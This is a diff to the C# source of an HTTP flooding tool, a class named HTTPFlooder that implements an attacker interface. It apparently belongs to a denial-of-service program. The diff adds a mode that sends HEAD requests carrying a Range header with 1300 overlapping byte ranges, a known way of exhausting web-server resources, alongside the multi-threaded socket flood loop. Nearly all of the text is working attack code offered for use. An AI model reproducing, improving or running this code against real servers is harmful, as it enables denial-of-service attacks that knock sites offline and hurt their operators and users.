@@ -1,19 +1,22 @@
 ﻿using System;
-using System.ComponentModel;
 using System.Net;
 using System.Net.Sockets;
 using System.Threading;
+using System.Text;
 namespace GAS.Core
 {
     public class HTTPFlooder : IAttacker
     {
+        private volatile byte[] buf;
         bool init = false;
         public IPAddress IP, DNS;
         public string Subsite;
         private Random rnd = new Random();
         private bool random, usegZip, IPOrDns = true, Resp;
         private Thread[] WorkingThreads;
-        public HTTPFlooder(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip,int threadcount)
+        private volatile int _attacktype = 0;
+        private string AttackHeader = "";
+        public HTTPFlooder(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip,int threadcount,int attacktype=0)
         {
             ThreadCount = threadcount;
             WorkingThreads = new Thread[ThreadCount];
@@ -33,6 +36,8 @@ namespace GAS.Core
             this.Timeout = timeout * 1000;
             this.random = random;
             this.usegZip = usegzip;
+            _attacktype = attacktype;
+
         }
         public override void Start()
         {
@@ -40,6 +45,31 @@ namespace GAS.Core
                 Stop();
             IsDelayed = false;
             IsFlooding = true;
+            StringBuilder tmp = new StringBuilder(6000);
+            for (int k = 0; k < 1300; tmp.Append(",5-" + (k++))) ;
+            this.AttackHeader = tmp.ToString();
+            #region Headers
+            if (this._attacktype == 0)
+                buf = System.Text.Encoding.ASCII.GetBytes(
+                 String.Format(random ? "GET {0}{1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n" :
+                                       "GET {0} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n",
+                                       Subsite,
+                                       Functions.RandomString(),
+                                       DNS,
+                                       ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) :
+                                       "")));
+            else
+            {
+                buf = System.Text.Encoding.ASCII.GetBytes(
+                    String.Format("HEAD {0}{1} HTTP/1.1{4}Accept: */*{4}User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}{3}Host: {2}{4}{4}Range:bytes=0-{5}{4}Connection: close{4}{4}",
+                            Subsite,
+                            (random ? Functions.RandomString() : null),
+                            DNS,
+                            (usegZip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null),
+                            Environment.NewLine,
+                            AttackHeader));
+            }
+            #endregion
             for (int i = 0; i < ThreadCount; i++)
                 (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i);
             init = true;
@@ -53,48 +83,12 @@ namespace GAS.Core
             {
                 #region Prepare
                 int bfsize = 1024; // this should be less than the MTU
-                byte[] buf = System.Text.Encoding.ASCII.GetBytes(
-                    String.Format(random ? "GET {0}{1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n" :
-                                          "GET {0} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n",
-                                          Subsite,
-                                          Functions.RandomString(),
-                                          DNS,
-                                          ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) :
-                                          "")));
                 byte[] recvBuf = new byte[bfsize];
                 int recvd = 0;
                 #endregion
                 #region DDos
                 while (IsFlooding)
                 {
-                    #region Old Source
-                    /*
-                    State = ReqState.Ready;
-                    try
-                    {
-                        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                        State = ReqState.Connecting;
-                        socket.Connect(this.IPOrDns? IP:DNS, Port);
-                        socket.Blocking = Resp;
-                        State = ReqState.Requesting;
-                        socket.ReceiveTimeout = Timeout;
-                        socket.Send(buf, SocketFlags.None);
-                        State = ReqState.Downloading; Requested++;
-                        if (Resp)
-                            try
-                            {
-                                recvd = 0;
-                                do { recvd = socket.Receive(recvBuf); }
-                                while ((recvd > bfsize) && socket.Connected);
-                                Downloaded++;
-                            }
-                            catch { Failed++; }
-                        socket.Close();
-                        State = ReqState.Completed;
-                    }
-                    catch { Failed++; }
-                    if (Delay > 0) System.Threading.Thread.Sleep(Delay);*/
-                    #endregion
                     #region New source
                     States[MY_INDEX_FOR_WORK] =  ReqState.Ready;
                     recvBuf = new byte[bfsize];
